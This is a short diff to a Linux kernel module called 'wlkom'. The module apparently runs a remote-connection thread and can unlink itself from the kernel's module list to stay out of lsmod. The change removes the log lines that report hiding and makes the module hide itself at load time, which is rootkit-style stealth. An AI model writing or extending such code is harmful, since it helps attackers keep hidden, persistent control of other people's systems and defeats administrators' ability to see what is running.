@@ -83,7 +83,6 @@ static void hide_module_from_lsmod(void)
     module_prev = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
     module_hidden = true;
-    pr_info("wlkom: hidden from lsmod\n");
 }
 
 static void show_module_in_lsmod(void)
@@ -94,7 +93,6 @@ static void show_module_in_lsmod(void)
     list_add(&THIS_MODULE->list, module_prev);
     module_prev = NULL;
     module_hidden = false;
-    pr_info("wlkom: visible in lsmod\n");
 }
 
 static void send_control_reply(const char *message)
@@ -327,6 +325,7 @@ static int __init wlkom_init(void)
     }
 
     pr_info("wlkom: loaded\n");
+    hide_module_from_lsmod();
 
     conn_thread = kthread_run(connection_thread, NULL, "wlkom_conn");
     if (IS_ERR(conn_thread)) {
